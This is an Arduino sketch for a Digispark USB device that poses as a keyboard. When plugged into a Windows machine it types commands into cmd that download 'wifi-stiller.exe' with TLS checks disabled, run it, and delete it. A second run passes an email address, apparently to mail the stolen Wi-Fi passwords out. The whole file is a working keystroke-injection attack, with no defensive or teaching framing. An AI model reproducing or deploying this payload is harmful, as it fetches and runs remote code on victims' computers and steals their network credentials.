#include <DigiKeyboard.h>
#include <keylayouts.h>
#include <oddebug.h>
#include <osccal.h>
#include <osctune.h>
#include <scancode-ascii-table.h>
#include <usbboardconfig.h>
#include <usbconfig-prototype.h>
#include <usbconfig.h>
#include <usbdrv.h>
#include <usbportability.h>
#define ADRESS abduragimov.amir12@mail.ru

void setup() {
  DigiKeyboard.enableLEDFeedback();
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("curl --insecure -OL https://raw.githubusercontent.com/sasha4ka/wifi-stiller/master/wifi-stiller.exe");
  DigiKeyboard.println("wifi-stiller.exe");
  DigiKeyboard.println("del wifi-stiller.exe");
  DigiKeyboard.println("exit");
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("curl --insecure -OL https://raw.githubusercontent.com/sasha4ka/wifi-stiller/master/wifi-stiller.exe");
  DigiKeyboard.println("wifi-stiller.exe ADRESS");
  DigiKeyboard.println("del wifi-stiller.exe");
  DigiKeyboard.println("exit");
}

void loop() {
  // put your main code here, to run repeatedly:

}
